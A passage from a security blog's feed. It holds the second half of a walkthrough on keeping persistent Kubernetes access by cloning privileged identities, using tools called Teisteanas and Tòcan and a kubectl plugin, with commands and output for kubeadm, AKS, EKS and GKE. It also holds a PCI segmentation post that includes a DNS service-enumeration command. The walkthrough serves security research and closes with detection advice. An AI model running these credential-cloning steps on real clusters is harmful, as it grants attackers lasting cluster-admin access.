&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;eathar rbac wildcardusers
Findings for the Users with wildcard access to all resources check
ClusterRoleBinding cluster-admin
Subjects:
  Kind: Group, Name: system:masters
RoleRef:
  Kind: ClusterRole, Name: cluster-admin, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding storage-version-migration-migrator-v2
Subjects:
  Kind: User, Name: system:storageversionmigrator
RoleRef:
  Kind: ClusterRole, Name: cluster-admin, APIGroup: rbac.authorization.k8s.io
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So we’ve got a nice user with cluster-admin access to use for client certificates. Looking for users with get secrets access we get the following:&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;ClusterRoleBinding kubelet-cluster-admin
Subjects:
RoleRef:
  Kind: ClusterRole, Name: system:node, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:controller:expand-controller
Subjects:
  Kind: ServiceAccount, Name: expand-controller, Namespace: kube-system
RoleRef:
  Kind: ClusterRole, Name: system:controller:expand-controller, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:controller:persistent-volume-binder
Subjects:
  Kind: ServiceAccount, Name: persistent-volume-binder, Namespace: kube-system
RoleRef:
  Kind: ClusterRole, Name: system:controller:persistent-volume-binder, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:glbc-status
Subjects:
  Kind: User, Name: system:controller:glbc
  Kind: User, Name: system:l7-lb-controller
RoleRef:
  Kind: ClusterRole, Name: system:glbc-status, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:kube-controller-manager
Subjects:
  Kind: User, Name: system:kube-controller-manager
RoleRef:
  Kind: ClusterRole, Name: system:kube-controller-manager, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:node
Subjects:
RoleRef:
  Kind: ClusterRole, Name: system:node, APIGroup: rbac.authorization.k8s.io
------------------------
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So we’ve got our usual &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;persistent-volume-binder&lt;/code&gt; service account and some other options as well.&lt;/p&gt;

&lt;h2 id=&quot;creating-a-cloned-user-account-using-teisteanas&quot;&gt;Creating a cloned user account using Teisteanas&lt;/h2&gt;

&lt;p&gt;Now we’ve got our list of users and service accounts we can clone, we can use &lt;a href=&quot;https://github.com/raesene/teisteanas&quot;&gt;Teisteanas&lt;/a&gt; to create Kubeconfigs which use client certificate authentication for users. You can do these steps manually, but Teisteanas makes it easy to do this quickly.&lt;/p&gt;

&lt;h3 id=&quot;kubeadm-125&quot;&gt;Kubeadm 1.25&lt;/h3&gt;

&lt;p&gt;Here we’ll create a clone for our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:kube-controller-manager&lt;/code&gt; user account.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;teisteanas -username system:kube-controller-manager
Certificate Successfully issued to username system:kube-controller-manager in group none , signed by kubernetes, valid until 2023-12-22 10:27:09 +0000 UTC
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From this we can see it succeeded in creating the kubeconfig and the expiry is 12 months, which is the default. We can now use this kubeconfig to authenticate to the cluster.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;kubectl --kubeconfig system\:kube-controller-manager.config auth can-i --list
Resources                                       Non-Resource URLs   Resource Names              Verbs
secrets                                         []                  []                          [create delete get update]
serviceaccounts                                 []                  []                          [create get update]
events                                          []                  []                          [create patch update]
events.events.k8s.io                            []                  []                          [create patch update]
endpoints                                       []                  []                          [create]
serviceaccounts/token                           []                  []                          [create]
tokenreviews.authentication.k8s.io              []                  []                          [create]
selfsubjectaccessreviews.authorization.k8s.io   []                  []                          [create]
selfsubjectrulesreviews.authorization.k8s.io    []                  []                          [create]
subjectaccessreviews.authorization.k8s.io       []                  []                          [create]
leases.coordination.k8s.io                      []                  []                          [create]
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see we’ve got plenty of rights. We can also use this kubeconfig to authenticate to the cluster and use it to create a new service accounts if we wanted to.&lt;/p&gt;

&lt;h3 id=&quot;aks-1246-1&quot;&gt;AKS 1.24.6&lt;/h3&gt;

&lt;p&gt;With AKS, the obvious target is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clusterAdmin&lt;/code&gt; user account.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;teisteanas -username clusterAdmin
Certificate Successfully issued to username clusterAdmin in group none , signed by ca, valid until 2023-12-22 10:29:41 +0000 UTC
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Again we get a one year lifetime on our credential.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;kubectl --kubeconfig clusterAdmin.config auth can-i --list
Resources                                       Non-Resource URLs   Resource Names   Verbs
*.*                                             []                  []               [*]
                                                [*]                 []               [*]
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Checking the rights, we get that delightful &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*.*&lt;/code&gt; which means we have full cluster admin access.&lt;/p&gt;

&lt;h3 id=&quot;eks-v12313-eks-fb459a0-1&quot;&gt;EKS v1.23.13-eks-fb459a0&lt;/h3&gt;

&lt;p&gt;Trying our client certificate generation technique on EKS, we get the following:&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;teisteanas -username eks:addon-manager
2022/12/22 16:15:42 Error issuing cert, are you trying this with EKS?
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This is because EKS has effectively disabled the CSR API for certificates that can authenticate to the Kubernetes API server. This isn’t officially in their documentation (that I can find) but there’s a &lt;a href=&quot;https://github.com/aws/containers-roadmap/issues/1604&quot;&gt;Github issue&lt;/a&gt; which confirms this.&lt;/p&gt;

&lt;h3 id=&quot;gke-v1247-gke900-1&quot;&gt;GKE v1.24.7-gke.900&lt;/h3&gt;

&lt;p&gt;For GKE we’re going to use our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:storageversionmigrator&lt;/code&gt; user account.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;teisteanas -username system:storageversionmigrator
Certificate Successfully issued to username system:storageversionmigrator in group none , signed by e3d7d8ea-bc41-4e34-a0d4-e7b7fdbbc66b, valid until 2027-12-21 18:02:26 +0000 UTC
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There’s an interesting difference here, which is that the certificate is valid for &lt;strong&gt;5 years&lt;/strong&gt; by default, which is a nice level of persistence!&lt;/p&gt;

&lt;p&gt;Checking the access we can confirm we have cluster-admin&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;ubectl --kubeconfig system\:storageversionmigrator.config auth can-i --list
Warning: the list may be incomplete: webhook authorizer does not support user rule resolution
Resources                                        Non-Resource URLs   Resource Names   Verbs
*.*                                              []                  []               [*]
                                                 [*]                 []               [*]
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;So that works pretty well, as it did with AKS and Kubeadm.&lt;/p&gt;

&lt;h2 id=&quot;cloning-service-account-credentials-with-tòcan&quot;&gt;Cloning service account credentials with tòcan&lt;/h2&gt;

&lt;p&gt;If we want to create an credential based on a service account, we can do that using the TokenRequest API. &lt;a href=&quot;https://github.com/raesene/tocan&quot;&gt;Tòcan&lt;/a&gt; is a tool which just wraps the API and automates creating the Kubeconfig file.&lt;/p&gt;

&lt;h3 id=&quot;kubeadm-125-1&quot;&gt;Kubeadm 1.25&lt;/h3&gt;

&lt;p&gt;For Kubeadm we’ll create a token for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;persistent-volume-binder&lt;/code&gt; service account in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kube-system&lt;/code&gt; namespace, and look to create the token for 1 year.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;tocan -service-account persistent-volume-binder -namespace kube-system -expiration-seconds 31536000
Kubeconfig file persistent-volume-binder.kubeconfig created for service account persistent-volume-binder in namespace kube-system
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can then check the rights with kubectl to confirm it worked ok&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;kubectl --kubeconfig persistent-volume-binder.kubeconfig auth can-i --list
Resources                                       Non-Resource URLs                     Resource Names   Verbs
persistentvolumes                               []                                    []               [create delete get list update watch]
pods                                            []                                    []               [create delete get list watch]
endpoints                                       []                                    []               [create delete get update]
services                                        []                                    []               [create delete get]
events.events.k8s.io                            []                                    []               [create patch update]
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
persistentvolumeclaims                          []                                    []               [get list update watch]
storageclasses.storage.k8s.io                   []                                    []               [get list watch]
nodes                                           []                                    []               [get list]
secrets                                         []                                    []               [get]
persistentvolumeclaims/status                   []                                    []               [update]
persistentvolumes/status                        []                                    []               [update]
events                                          []                                    []               [watch create patch update]
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can also check the expiration of the token. Probably the easiest way to do this is just paste the token into &lt;a href=&quot;https://jwt.io/&quot;&gt;jwt.io&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raesene.github.io/assets/media/pvbjwt.png&quot; alt=&quot;jwt token issued for the persistent volume binder service account&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From this the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exp&lt;/code&gt; value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1703242042&lt;/code&gt; can be decoded to show that the token expires on Friday, 22 December 2023 10:47:22.&lt;/p&gt;

&lt;h3 id=&quot;aks-1246-2&quot;&gt;AKS 1.24.6&lt;/h3&gt;

&lt;p&gt;For AKS we can use the same service account as it was one of the ones returned in our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eathar&lt;/code&gt; checks for access to secrets at the cluster level, and this works the same way, including the 1 year expiration, which works fine.&lt;/p&gt;

&lt;h3 id=&quot;eks-v12313-eks-fb459a0-2&quot;&gt;EKS v1.23.13-eks-fb459a0&lt;/h3&gt;

&lt;p&gt;For EKS we can again create a token for the same service account and it will issue ok. However looking at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exp&lt;/code&gt; field of the token we can see it’s only valid for 24 hours, a far cry from the 1 year we were expecting. It appears that AWS have decided to limit the maximum duration of issued tokens. So whilst this technique works, it’d be quite a bit more noisy as it would require daily refreshes.&lt;/p&gt;

&lt;h3 id=&quot;gke-v1247-gke900-2&quot;&gt;GKE v1.24.7-gke.900&lt;/h3&gt;

&lt;p&gt;for GKE we can use the same service account again as it was one of the ones returned with our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eathar&lt;/code&gt; checks.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tocan -service-account persistent-volume-binder -namespace kube-system -expiration-seconds 31536000
W1222 18:04:58.428287   96628 warnings.go:70] requested expiration of 31536000 seconds shortened to 172800 seconds
Kubeconfig file persistent-volume-binder.kubeconfig created for service account persistent-volume-binder in namespace kube-system
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Interestingly we get a warning and GKE has done something similar to EKS in that it’s limited the maximum duration of issued tokens, this time to two days. So again, whilst this technique works, it’d be quite a bit more noisy as it would require refreshes every other day.&lt;/p&gt;

&lt;h2 id=&quot;stealing-secrets-from-existing-service-accounts&quot;&gt;Stealing secrets from existing service accounts&lt;/h2&gt;

&lt;p&gt;As mentioned this one only works in older clusters as the Kubernetes project have been working to reduce the use of non-expiring service account secrets. Where we do find a cluster, we don’t need any new tooling to create our Kubeconfig file as there’s a &lt;a href=&quot;https://krew.sigs.k8s.io/&quot;&gt;krew&lt;/a&gt; plugin called &lt;a href=&quot;https://github.com/superbrothers/kubectl-view-serviceaccount-kubeconfig-plugin&quot;&gt;view-serviceaccount-kubeconfig&lt;/a&gt; which we can use.&lt;/p&gt;

&lt;h3 id=&quot;kubeadm-125-2&quot;&gt;Kubeadm 1.25&lt;/h3&gt;

&lt;p&gt;Checking for secrets in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kube-system&lt;/code&gt; we can see that they’re not there (as expected)&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;kubectl get secrets -n kube-system
NAME                     TYPE                            DATA   AGE
bootstrap-token-abcdef   bootstrap.kubernetes.io/token   6      6h33m
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;so if we try to create a kubeconfig file we get an error&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;kubectl view-serviceaccount-kubeconfig persistent-volume-binder -n kube-system
Error: serviceaccount persistent-volume-binder has no secrets
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;aks-1246-3&quot;&gt;AKS 1.24.6&lt;/h3&gt;

&lt;p&gt;This technique doesn’t work in AKS as there are no secrets for service accounts in 1.24&lt;/p&gt;

&lt;h3 id=&quot;eks-v12313-eks-fb459a0-3&quot;&gt;EKS v1.23.13-eks-fb459a0&lt;/h3&gt;

&lt;p&gt;The default EKS cluster that we got created is running 1.23, so this technique still works&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;kubectl view-serviceaccount-kubeconfig persistent-volume-binder -n kube-system &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;persistent-volume-binder-secret.kubeconfig
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;We can then test the kubeconfig file to make sure it works&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt; kubectl --kubeconfig persistent-volume-binder-secret.kubeconfig auth can-i --list
Resources                                       Non-Resource URLs                     Resource Names     Verbs
persistentvolumes                               []                                    []                 [create delete get list update watch]
pods                                            []                                    []                 [create delete get list watch]
endpoints                                       []                                    []                 [create delete get update]
services                                        []                                    []                 [create delete get]
events.events.k8s.io                            []                                    []                 [create patch update]
selfsubjectaccessreviews.authorization.k8s.io   []                                    []                 [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []                 [create]
persistentvolumeclaims                          []                                    []                 [get list update watch]
storageclasses.storage.k8s.io                   []                                    []                 [get list watch]
nodes                                           []                                    []                 [get list]
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Decoding the token we see something interesting about the old secrets based tokens, which is… no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exp&lt;/code&gt; parameter, as they don’t expire!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raesene.github.io/assets/media/pvbsecrettoken.png&quot; alt=&quot;jwt token issued for the persistent volume binder service account&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;gke-v1247-gke900-3&quot;&gt;GKE v1.24.7-gke.900&lt;/h3&gt;

&lt;p&gt;This technique doesn’t work in GKE as there are no secrets for service accounts in 1.24&lt;/p&gt;

&lt;h2 id=&quot;preventing-and-detecting-these-attacks&quot;&gt;Preventing and detecting these attacks&lt;/h2&gt;

&lt;p&gt;If you’re on the cluster operator side of things, how would you prevent or detect these attacks? Both service account tokens and client certificates are part of core Kubernetes and can’t be disabled. Client certificate can’t be revoked and revoking service account tokens requires deleting the attached service account, which is tricky if what’s been cloned is a core service account.&lt;/p&gt;

&lt;p&gt;I could give the standard security answer of “just make sure people don’t have access to those APIs” but that’s probably not very practical in reality for a lot of clusters.&lt;/p&gt;

&lt;p&gt;Keeping the API server off the Internet would definitely help as it makes it harder for the attacker to use their cloned credentials.&lt;/p&gt;

&lt;p&gt;In terms of detecting this, the obvious suggestion is Kubernetes audit logging. First, make sure you have it enabled! Then look at any access to the CSR API and the TokenRequest API. Finding the attacker using their cloned accounts is tricky as the audit service doesn’t denote anything about the credential used, so you can’t tell the difference between a legitimate service account use and an attacker’s cloned service account token, for example.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;There’s a couple of interesting points in this (for me). First up is the difference in how well the techniques work in different cluster types. EKS appears to have the most restrictive setup and has reduced the efficacy of these attacks quite a bit, although it’s current version still allows for the older secret based attack. AKS and GKE both allow the attacks to work, although GKE does mitigate the new service account token attacks by limiting the maximum duration of issued tokens.&lt;/p&gt;

&lt;p&gt;Here’s a matrix of our attacks and how they work in the different clusters we tested.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raesene.github.io/assets/media/attackmatrix.png&quot; alt=&quot;Attack matrix&quot; /&gt;&lt;/p&gt;

</description>
				<pubDate>Wed, 21 Dec 2022 18:27:00 +0000</pubDate>
				<link>https://raesene.github.io/blog/2022/12/21/Kubernetes-persistence-with-Tocan-and-Teisteanas/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2022/12/21/Kubernetes-persistence-with-Tocan-and-Teisteanas/</guid>
			</item>
		
			<item>
				<title>PCI Compliance for Kubernetes in detail - Part 16 - Segmentation</title>
				<description>&lt;p&gt;This is the sixteenth part of a series of posts looking at the PCI recommendations for container security as they apply to Kubernetes environments. This time we’re looking at the Segmentation section. An index of the posts in this series can be found &lt;a href=&quot;https://www.container-security.site/defenders/PCI_Container_Orchestration_Guidance.html&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The topic of segmentation in Kubernetes is an interesting one. First let’s talk a bit about what PCI means by Segmentation. From &lt;a href=&quot;https://listings.pcisecuritystandards.org/documents/Guidance-PCI-DSS-Scoping-and-Segmentation_v1.pdf&quot;&gt;this document&lt;/a&gt; we can see this definition&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Segmentation involves the implementation of additional controls to separate systems with different security needs. For example, in order to reduce the number of systems in scope for PCI DSS, segmentation may be used to keep in-scope systems separated from out-of-scope systems. 
Segmentation can consist of logical controls, physical controls, or a combination of both. Examples of commonly used segmentation methods for purposes of reducing PCI DSS scope include firewalls and router configurations to prevent traffic passing between out-of-scope networks and the CDE, network configurations that prevent communications between different systems and/or subnets, and physical access controls.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So in order to implement segmentation in a containerized environment we need to put controls in place so that there is effective security segregation between in-scope workloads and out-of-scope workloads.&lt;/p&gt;

&lt;p&gt;With Kubernetes there’s a couple of ways you can implement this kind of control. The easiest (from a security point of view) is to use separate clusters for in-scope and out-of-scope workloads, however some organizations might not like this approach as it reduces the cost benefits of Kubernetes as it requires multiple sets of control plane nodes and reduces the ability to share resources between workloads.&lt;/p&gt;

&lt;p&gt;The other approach is to try and use a single cluster for both in-scope and out-of-scope workloads, we need to harden the cluster such that we’re providing appropriate security segmentation, a.k.a hard multi-tenancy.&lt;/p&gt;

&lt;h2 id=&quot;hard-multi-tenancy-in-kubernetes&quot;&gt;Hard Multi-Tenancy in Kubernetes&lt;/h2&gt;

&lt;p&gt;To provide hard multi-tenancy in a Kubernetes cluster there are a number of considerations that need to be taken into account, and challenges to be overcome. Typically this kind of solution would be based on the use of Kubernetes namespaces as a unit of security segmentation, but it’s important to recognize that this (and Kubernetes in general) wasn’t designed for a hard multi-tenancy use case.&lt;/p&gt;

&lt;p&gt;The sections below aren’t intended to be an exhaustive treatment of the challenges of hard multi-tenancy in Kubernetes (that would require it’s own blog post series!) but to indicate some of the complexity and why it’s not a trivial problem to solve.&lt;/p&gt;

&lt;h3 id=&quot;kubernetes-api-segregation&quot;&gt;Kubernetes API Segregation&lt;/h3&gt;

&lt;p&gt;The first challenge is that the Kubernetes API itself. There are a number of resources in a cluster wide and not namespaced, so we need to ensure that users in the “low security” namespace(s) can’t access these resources, which restricts the facilities that they can use. This particular issue can be mitigated via the use of “virtual cluster” style solutions such as &lt;a href=&quot;https://www.vcluster.com/&quot;&gt;vcluster&lt;/a&gt;, which create virtual Kubernetes clusters on top of a single host cluster. You can then provide full access to the Kubernetes API to the virtual cluster, but restrict access to the host cluster.&lt;/p&gt;

&lt;p&gt;If you’re not using a virtual cluster solution, part of this also involves strict RBAC controls which prevent “low security” users from escalating their rights to access “high security” workloads. There’s a page on the &lt;a href=&quot;https://kubernetes.io/docs/concepts/security/rbac-good-practices/#privilege-escalation-risks&quot;&gt;Kubernetes site&lt;/a&gt; which discusses some of the areas to consider here.&lt;/p&gt;

&lt;h3 id=&quot;workload-segregation&quot;&gt;Workload Segregation&lt;/h3&gt;

&lt;p&gt;Virtual clusters alone, however, don’t provide the full solution. Where workloads are being deployed to a shared set of clusters nodes there is a risk that any workload can break out to an underlying node from the “low security” namespace and then access parts of the “high security” environment. Mitigating this will require adoption of admission control solutions such as &lt;a href=&quot;https://kyverno.io/&quot;&gt;Kyverno&lt;/a&gt; with a highly restrictive set of policies to reduce the risk of privilege escalation. Typically you’d expect these policies to be in-line with the &lt;a href=&quot;https://kubernetes.io/docs/concepts/security/pod-security-standards/#restricted&quot;&gt;restricted PSS&lt;/a&gt; policy.&lt;/p&gt;

&lt;p&gt;This doesn’t provide a complete picture, however as you still have the risk of container breakout via Linux kernel/runc/Containerd/Docker CVEs. You can reduce this risk by using a solutions like &lt;a href=&quot;https://gvisor.dev/&quot;&gt;gVisor&lt;/a&gt; or &lt;a href=&quot;https://katacontainers.io/&quot;&gt;Kata Containers&lt;/a&gt; to provide a smaller attack surface, hardening the container runtime environment.&lt;/p&gt;

&lt;p&gt;Another approach which might help here is to implement separate node pools for each environment. This reduces the workload resource sharing benefit of Kubernetes, but does reduce the risk of a breakout from one environment to another.&lt;/p&gt;

&lt;p&gt;There is also a complication with this approach, which is that any workloads which have privileged access to the Kubernetes API server (e.g. operators, or admission control services) should not be placed in the “low security” node pool, as this would allow them to escalate privileges to the “high security” environment, via service account tokens. This approach also relies on the use of “node authorization” in Kubernetes otherwise the Kubelet credentials can be used to escalate privileges to the “high security” environment. Whilst this plugin is enabled in most Kubernetes distributions, it’s not guaranteed, (for example at the time of writing it’s not enabled in AKS and cluster operators cannot enable it by themselves).&lt;/p&gt;

&lt;h3 id=&quot;network-segregation&quot;&gt;Network Segregation&lt;/h3&gt;

&lt;p&gt;As we discussed back in the &lt;a href=&quot;https://raesene.github.io/blog/2022/10/23/PCI-Kubernetes-Section4-network-security/&quot;&gt;network section&lt;/a&gt; Kubernetes defaults to an open flat network for all workloads in the cluster. This is obviously not suitable for a hard multi-tenancy solution, so it would be necessary to implement strict network policies restricting traffic between the two environments.&lt;/p&gt;

&lt;p&gt;However there’s another aspect of network segregation in Kubernetes which can be tricky to mitigate, which is DNS. DNS is used for service discovery in clusters, and this is a cluster-wide service. To provide effective segregation it would be necessary to split the DNS service into two separate services, one for each environment. Without this it’s generally trivial for an attacker to enumerate every service in the cluster, using commands like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dig +short srv any.any.svc.cluster.local&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;In terms of the PCI requirements there’s four in this section.&lt;/p&gt;

&lt;h2 id=&quot;section-161&quot;&gt;Section 16.1&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Threat&lt;/strong&gt; -  Unless an orchestration system is specifically designed for secure multi-tenancy, a shared mixed-security environment may allow attackers to move from a low-security to a high-security environment.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Best Practice&lt;/strong&gt; - Where practical, higher security components should be placed on dedicated clusters. Where this is not possible, care should be taken to ensure complete segregation between workloads of different security levels&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Details&lt;/strong&gt; - Reviewing an environment for this requirement, would generally involve looking at deployed workloads for the in-scope clusters and confirming that they are only running in-scope workloads.&lt;/p&gt;

&lt;h2 id=&quot;section-162&quot;&gt;Section 16.2&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Threat&lt;/strong&gt; -  Placing critical systems on the same nodes as general application containers may allow attackers to disrupt the security of the cluster through the use of shared resources on the container cluster node.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Best Practice&lt;/strong&gt; - Critical systems should run on dedicated nodes in any container orchestration cluster.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Details&lt;/strong&gt; - As discussed using dedicated node pools is an option to try and ensure workload segregation, but it’s a tricky one to implement well. Reviewing a cluster for this would generally involve looking at the worklods deployed to each environment and confirming that there are no privilege escalation paths, via things like service account tokens, or Kubelet credentials.&lt;/p&gt;

&lt;h2 id=&quot;section-163&quot;&gt;Section 16.3&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Threat&lt;/strong&gt; -  Placing workloads with different security requirements on the same cluster nodes may allow attackers to gain unauthorized access to high security environments via breakout to the underlying node.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Best Practice&lt;/strong&gt; - Split cluster node pools should be enforced such that a cluster user of the low-security applications cannot schedule workloads to the high-security nodes.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Details&lt;/strong&gt; - For workload scheduling segregation, admission control solutions are required, so reviewing an environment for this would involve reviewing the policies in place and also reviewing the security of the admission control solution itself.&lt;/p&gt;

&lt;h2 id=&quot;section-164&quot;&gt;Section 16.4&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Threat&lt;/strong&gt; - Modification of shared cluster resources by users with access to individual applications could result in unauthorized access to sensitive shared resources.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Best Practice&lt;/strong&gt; - Workloads and users who manage individual applications running under the orchestration system should not have the rights to modify shared cluster resources, or any resources used by another application.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Details&lt;/strong&gt; - How this is reviewed would depend on the approach taken. Where a virtual cluster solution is used, it might be possible to review to ensure that virtual cluster admins have no access to the underlying master cluster. Where Kubernetes RBAC is used for this, it would require a review of RBAC policies to ensure that users can’t escalate privileges to access in-scope workloads from the “low security” environment.&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;Segmentation is an important part of PCI security and applying it to Kubernetes can be tricky, as it’s not designed for hard multi-tenancy.&lt;/p&gt;

</description>
				<pubDate>Tue, 20 Dec 2022 08:27:00 +0000</pubDate>
				<link>https://raesene.github.io/blog/2022/12/20/PCI-Kubernetes-Section16-Segmentation/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2022/12/20/PCI-Kubernetes-Section16-Segmentation/</guid>
			</item>
		
			<item>
				<title>PCI Compliance for Kubernetes in detail - Part 15 - Configuration Management</title>
